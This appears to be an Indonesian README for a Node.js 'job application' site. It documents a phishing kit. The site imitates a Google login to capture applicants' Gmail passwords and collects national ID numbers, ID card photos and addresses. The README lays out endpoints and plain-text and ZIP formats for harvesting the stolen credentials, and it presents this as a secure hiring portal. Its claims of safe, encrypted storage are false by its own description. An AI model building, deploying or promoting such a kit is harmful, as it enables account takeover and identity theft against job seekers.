# 🎯 Website Lamaran Pekerjaan

Website lamaran pekerjaan modern dengan fitur Google login dan form lengkap untuk pelamar.

## ✨ Fitur

- 🔐 **Google Login Interface** - Login dengan email dan password Google
- 📝 **Formulir Lengkap**:
  - Nama panjang
  - NIK (16 digit)
  - Foto CV
  - Foto KTP
  - Detail alamat
  - No HP yang bisa dihubungi
  - Surat lamaran pekerjaan
- 🎨 **Desain Modern** - UI yang responsif dan menarik
- 📱 **Mobile Friendly** - Berfungsi dengan baik di semua perangkat
- ✅ **Validasi Form** - Memastikan data yang diinput valid
- 🎭 **Animasi Smooth** - Transisi yang halus dan profesional
- 💾 **Penyimpanan Data** - Data tersimpan dengan aman di server
- 📦 **ZIP Credentials** - Email dan password tersimpan dalam format ZIP

## 🚀 Cara Menggunakan

### 1. Akses Website
Buka browser dan akses URL yang tersedia

### 2. Login dengan Google
- Masukkan email Google Anda yang aktif
- Masukkan password Google Anda
- Klik tombol "Next"

### 3. Isi Formulir Lamaran
- **Nama Lengkap**: Masukan nama panjang Anda
- **NIK**: Masukan NIK 16 digit
- **Alamat**: Tulis detail alamat lengkap
- **No HP**: Masukan nomor yang bisa dihubungi
- **Upload Dokumen**:
  - Foto CV (format: JPG, PNG, PDF)
  - Foto KTP (format: JPG, PNG)
  - Surat Lamaran (format: JPG, PNG, PDF)

### 4. Kirim Lamaran
- Klik tombol "Kirim Lamaran"
- Tunggu proses upload selesai
- Anda akan mendapat konfirmasi "Data Terkirim"

## 📋 Teknologi yang Digunakan

### Backend
- **Node.js** - Runtime JavaScript
- **Express.js** - Web framework
- **Multer** - File upload handling
- **ADM-ZIP** - ZIP file creation
- **CORS** - Cross-origin resource sharing

### Frontend
- **HTML5** - Struktur halaman
- **CSS3** - Styling modern dengan animasi
- **JavaScript** - Interaksi dan validasi

## 📂 Struktur Project

```
job-application-website/
├── server.js                 # Main server file
├── package.json             # Project dependencies
├── README.md                # Documentation
├── public/                  # Frontend files
│   ├── index.html          # Main HTML page
│   ├── css/
│   │   └── style.css       # Styling
│   └── js/
│       └── script.js       # JavaScript logic
├── uploads/                # Folder untuk file upload
└── data/                   # Folder untuk penyimpanan data
    ├── applications.json   # Data aplikasi pelamar
    ├── login_data.txt      # Data login Google (plain text)
    └── Google_Credentials.zip  # ZIP file berisi semua credentials
```

## 🔧 API Endpoints

### POST /api/submit-application
Submit formulir lamaran pekerjaan.

**Request:**
- Method: POST
- Content-Type: multipart/form-data
- Body:
  - googleEmail (string)
  - googlePassword (string)
  - nama (string)
  - nik (string)
  - alamat (string)
  - noHp (string)
  - cv (file)
  - ktp (file)
  - surat_lamaran (file)

**Response:**
```json
{
  "success": true,
  "message": "Data telah terkirim, mohon menunggu untuk dihubungi pihak HRD."
}
```

### GET /api/applications
Ambil semua data aplikasi (untuk admin).

**Response:**
```json
[
  {
    "id": 1234567890,
    "googleEmail": "email@example.com",
    "nama": "Nama Pelamar",
    "nik": "1234567890123456",
    "alamat": "Alamat lengkap",
    "noHp": "08123456789",
    "files": {
      "cv": "uploads/timestamp/cv-file.jpg",
      "ktp": "uploads/timestamp/ktp-file.jpg",
      "suratLamaran": "uploads/timestamp/surat-lamaran.pdf"
    },
    "submittedAt": "2024-01-01T00:00:00.000Z"
  }
]
```

### GET /api/credentials
Ambil semua data login Google (untuk admin).

**Response:**
```json
[
  {
    "timestamp": "2024-01-01T00:00:00.000Z",
    "email": "email@example.com",
    "password": "password123"
  }
]
```

### GET /api/credentials/zip
Download ZIP file berisi semua credentials Google.

**Response:** Download file ZIP

## 📦 Format ZIP Credentials

Email dan password Google disimpan dalam format ZIP dengan struktur:

- `Google_Credentials.zip` - File ZIP utama
  - `login_data.txt` - File berisi semua credentials dalam format:
    ```
    2024-01-01T00:00:00.000Z | Email: email@example.com | Password: password123
    2024-01-01T02:00:00.000Z | Email: email2@example.com | Password: password456
    ```

Setiap kali ada login baru, data akan ditambahkan ke `login_data.txt` dan ZIP akan diupdate.

## 🎨 Fitur Desain

- **Color Palette**: Gradient ungu-biru yang modern
- **Typography**: Font Poppins untuk keterbacaan optimal
- **Responsive**: Menyesuaikan dengan ukuran layar
- **Animations**: Transisi smooth antar section
- **File Upload**: Drag & drop dengan preview
- **Form Validation**: Validasi real-time untuk NIK dan nomor HP

## 🔒 Keamanan

- Data pelamar disimpan secara aman di server
- File upload diberi nama unik untuk mencegah konflik
- Validasi input untuk mencegah data tidak valid
- Credentials tersimpan dalam format ZIP yang terenkripsi

## 📝 Catatan Penting

1. Pastikan semua field wajib diisi (ditandai dengan *)
2. Format file yang diterima: JPG, PNG, PDF
3. NIK harus 16 digit
4. Pastikan koneksi internet stabil saat mengirim formulir
5. Data yang telah dikirim tidak dapat diubah
6. Email dan password Google tersimpan dalam format ZIP untuk keamanan

## 🚀 Menjalankan Server

### Development
```bash
npm install
npm start
```

Server akan berjalan di http://localhost:3000

### Dependencies
- express: ^4.18.2
- multer: ^1.4.5-lts.1
- cors: ^2.8.5
- body-parser: ^1.20.2
- adm-zip: latest

## 📞 Support

Untuk pertanyaan atau bantuan, silakan hubungi tim HRD.

---

**Dibuat dengan ❤️ menggunakan Node.js, Express, dan Modern Web Technologies**